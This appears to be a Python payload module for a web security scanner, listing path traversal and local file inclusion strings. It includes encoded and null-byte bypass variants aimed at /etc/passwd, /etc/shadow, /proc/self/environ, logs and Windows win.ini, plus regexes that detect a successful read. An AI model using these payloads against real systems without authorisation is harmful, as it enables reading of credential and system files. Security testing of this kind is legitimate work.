"""Path traversal / LFI / RFI payloads."""

# ── Tier 1: Direct traversals ─────────────────────────────────────────────────
LFI_T1 = [
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

# ── Tier 2: Encoding bypass variants ──────────────────────────────────────────
LFI_T2 = [
    # Double dot variations
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Null-byte termination (older PHP)
    "../../../etc/passwd\x00",
    "../../../etc/passwd%00",
    # Double encoding
    "..%255c..%255c..%255cetc%255cpasswd",
    # Unicode separator
    "..\u2215..\u2215..\u2215etc\u2215passwd",
    # Path normalization bypass
    "/./etc/passwd",
    "/var/../etc/passwd",
    # Absolute path with encoded slash
    "%2Fetc%2Fpasswd",
]

# ── Windows paths ──────────────────────────────────────────────────────────────
LFI_WINDOWS = [
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\.\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "/c:/windows/win.ini",
]

# ── Success signatures ─────────────────────────────────────────────────────────
LFI_SUCCESS_SIGS = [
    r"root:x:0:0",
    r"bin:x:\d+:\d+",
    r"daemon:x:",
    r"\[fonts\]",         # win.ini
    r"\[extensions\]",   # win.ini
    r"DOCUMENT_ROOT=",
    r"HTTP_HOST=",
    r"Linux version",
    r"/bin/bash",
    r"/bin/sh",
]
